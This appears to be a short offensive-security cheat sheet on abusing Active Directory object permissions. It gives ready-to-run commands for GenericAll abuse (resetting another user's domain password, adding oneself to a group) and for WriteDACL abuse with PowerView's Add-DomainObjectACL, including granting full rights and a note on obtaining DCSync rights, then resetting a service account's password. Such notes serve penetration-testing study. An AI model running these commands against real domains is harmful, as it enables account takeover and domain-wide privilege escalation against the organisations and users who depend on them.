# Object Security

<details>

<summary>Generic All Abuse</summary>

**Users**

If userA has generic all over userB, userA can change the password of userB

```
net user userb password1 /domain
```

**Groups**

If userA has generic all over the group `testgroup` we can just add ourselves to the group

```
net group testgroup userA /add /domain
```

</details>

<details>

<summary>WriteDACL</summary>

You can abuse the WriteDACL permission by using the `Add-DomainObjectACL` powerview method to add Generic all to this. If this DACL is the domain object, you can add DC Sync `Add-DomainObjectACL -TargetIdentity (object) -PrincipalIdentity offsec -Rights all`

{% code overflow="wrap" %}
```powershell
Add-DomainObjectACL -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights all
```
{% endcode %}

now you can change its password

```powershell
net user testservice2 password1 /domain
```

</details>
